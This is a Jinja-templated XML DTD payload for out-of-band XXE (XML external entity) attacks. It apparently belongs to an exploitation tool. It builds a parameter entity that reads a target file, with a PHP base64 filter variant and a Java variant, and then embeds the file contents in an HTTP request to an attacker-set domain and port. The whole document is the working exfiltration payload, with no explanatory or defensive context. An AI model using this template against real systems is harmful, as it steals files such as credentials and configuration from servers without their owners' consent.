{% if file.lang.java %}
<!ENTITY % file SYSTEM "{{ url }}">
{% elif file.lang.php %}
{% if file.base64 %}
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={{ url }}">
{% else %}
<!ENTITY % file SYSTEM "{{ url }}">
{% endif %}
{% endif %}
<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://{{ domain }}:{{ port }}/?%file;'>">
%all;
